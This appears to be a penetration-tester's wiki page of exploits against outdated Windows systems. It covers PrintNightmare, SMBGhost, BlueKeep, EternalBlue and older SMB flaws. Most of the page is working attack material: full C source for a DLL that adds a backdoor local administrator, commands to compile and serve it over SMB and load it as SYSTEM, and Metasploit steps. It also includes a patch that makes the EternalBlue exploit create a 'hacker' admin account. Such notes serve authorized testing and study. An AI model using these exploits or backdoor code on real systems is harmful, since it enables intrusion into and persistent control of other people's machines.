---
title: Remote Code Execution Exploits
---

Exploits to take over outdated [[notes/windows/index]] systems.

# PrintNightmare / [CVE-2021-1675](https://www.opencve.io/cve/CVE-2021-1675)

Vulnerability in [[notes/network/smb]] affects all versions from XP up to Windows 10 1607 and Server 2016.

Exploitation requires SMB access as unprivileged user and a running print spooler.

`./adduser.c` ([source](http://web.archive.org/web/20221209130709/https://mayfly277.github.io/posts/GOADv2-pwning-part5/)):

~~~ c
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>

DWORD CreateAdminUserInternal(void) {
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;  // 256 bytes should be enough for everybody
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmare");               // username
    ud.usri1_password    = _T("Test123456789!");           // password
    ud.usri1_priv        = USER_PRIV_USER;                 // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;  // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,         // local server
        1,            // information level
        (LPBYTE)&ud,
        NULL          // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                 // local server
        _T("Administrators"),
        0,                    // information level
        (LPBYTE)&gd,
        1                     // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    CreateAdminUserInternal();
}
#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main() {
    return CreateAdminUserInternal();
}
~~~

Compile DLL.

~~~ bash
x86_64-w64-mingw32-gcc -shared -o ./adduser.dll ./adduser.c -lnetapi32
~~~

Serve DLL over SMB.

~~~ bash
sudo impacket-smbserver -smb2support share .
~~~

Run script from [cube0x0/cve-2021-1675](https://github.com/cube0x0/CVE-2021-1675) to load the DLL in system context.

~~~ bash
python3 ./CVE-2021-1675.py corp.local/jdoe:'passw0rd'@srv01.corp.com '\\192.168.178.42\share\adduser.dll'
~~~

To clean up delete `C:\Windows\System32\spool\drivers\x64\3\adduser.dll` and `C:\Windows\System32\spool\drivers\x64\3\Old\*\adduser.dll`.

Other tools:

- [ly4k/printnightmare](https://github.com/ly4k/PrintNightmare)

# SMBGhost / [CVE-2020-0796](https://www.opencve.io/cve/CVE-2020-0796)

Vulnerability in [[notes/network/smb|SMBv3]] affects Windows 10 1909.

Exploit with Metasploit `exploit/windows/smb/cve_2020_0796_smbghost`.
Remote exploitation is pretty unstable and likely causes a BSOD.

# BlueKeep / [CVE-2019-0708](https://www.opencve.io/cve/CVE-2019-0708)

Vulnerability in [[notes/network/rdp]] affects Windows 7 SP1 and Windows Server 2008 R2.

Exploitation.

=== "[[notes/tools/metasploit]]"
    ~~~
    â¯ msfconsole -q
    msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
    msf6 > set RHOSTS srv01.corp.local
    msf6 > check
    msf6 > set TARGET 1
    msf6 > set GROOMSIZE 50
    msf6 > run
    ~~~

# EternalBlue / [CVE-2017-0143](https://www.opencve.io/cve/CVE-2017-0143) - [CVE-2017-0148](https://www.opencve.io/cve/CVE-2017-0148)

Vulnerability in [[notes/network/smb|SMBv1]] affects all versions from XP up to Windows 10 1607 and Server 2016.

Discovery.

=== "[[notes/tools/crackmapexec]]"
    ~~~ bash
    crackmapexec smb srv01.corp.local -d corp.local -u jdoe -p 'passw0rd' -M ms17-010
    ~~~

Exploit with an inline shell from [3ndg4me/autoblue-ms17-010](https://github.com/3ndG4me/AutoBlue-MS17-010).

~~~
$ python3 ./zzz_exploit.py srv01.corp.local
[...]
C:\WINDOWS\system32>whoami
nt-autority\system
~~~

Apply the following patch if you encounter encoding errors:

~~~
--- a/mysmb.py
+++ b/mysmb.py
@@ -519,7 +519,7 @@ class RemoteShell(cmd.Cmd):

     def send_data(self, data):
         self.execute_remote(data)
-        print(self.__outputBuffer.decode())
+        print(self.__outputBuffer.decode(errors='ignore'))
         self.__outputBuffer = b''

 class SMBServer(Thread):
~~~

Exploit with a modified version from [helviojunior/ms17-010](https://github.com/helviojunior/MS17-010) that adds a backdoor account.
This is more reliable then creating a reverse shell.

Apply the following patch:

~~~
--- a/zzz_exploit.py
+++ b/zzz_exploit.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python2
 from impacket import smb, smbconnection
 from mysmb import MYSMB
 from struct import pack, unpack, unpack_from
@@ -972,11 +974,11 @@
 def smb_pwn(conn, arch):
 	smbConn = conn.get_smbconnection()
 	
-	print('creating file c:\\pwned.txt on the target')
-	tid2 = smbConn.connectTree('C$')
-	fid2 = smbConn.createFile(tid2, '/pwned.txt')
-	smbConn.closeFile(tid2, fid2)
-	smbConn.disconnectTree(tid2)
+	#print('creating file c:\\pwned.txt on the target')
+	#tid2 = smbConn.connectTree('C$')
+	#fid2 = smbConn.createFile(tid2, '/pwned.txt')
+	#smbConn.closeFile(tid2, fid2)
+	#smbConn.disconnectTree(tid2)
 	
 	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
 	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
@@ -984,6 +986,11 @@
 	# a simple method to get shell (but easily to be detected by AV) is
 	# executing binary generated by "msfvenom -f exe-service ..."

+	print('pwning smb')
+	service_exec(conn, r'net user hacker P@ssw0rd /add')
+	service_exec(conn, r'net localgroup administrators hacker /add')
+
+
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
 	with open(localSrc, 'rb') as fp:
 		smbConn.putFile(remoteDrive + '$', remotePath, fp.read)
~~~

Alternatively exploit using Metasploit `exploit/windows/smb/ms17_010_eternalblue` or `exploit/windows/smb/ms17_010_psexec`.

References:

- [twitter.com/snovvcrash/status/1636406117403328513](https://twitter.com/snovvcrash/status/1636406117403328513), alternate exploitation that dumps SAM

# Server Service NetAPI Parser Flaw / [CVE-2008-4250](https://www.opencve.io/cve/CVE-2008-4250) / [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067)

Vulnerability in[[notes/network/smb]] affects Windows 2000, XP, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta.

Exploitation with Metasploit `exploit/windows/smb/ms08_067_netapi` (untested).

# Stack Buffer Overflow in Windows Plug and Play Service / [CVE-2005-1983](https://www.opencve.io/cve/CVE-2005-1983) / [MS05-039](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2005/MS05-039)

Vulnerability in[[notes/network/smb]] affects Windows 2000, XP up to SP1 and Server 2003 up to SP1.

Spawn reverse shell with [ms05-039.c](http://web.archive.org/web/20221006110711/https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS05-039/PnP_Service.c).

Can also be exploited with Metasploit `exploit/windows/smb/ms05_039_pnp` and `windows/download_exec` as payload.
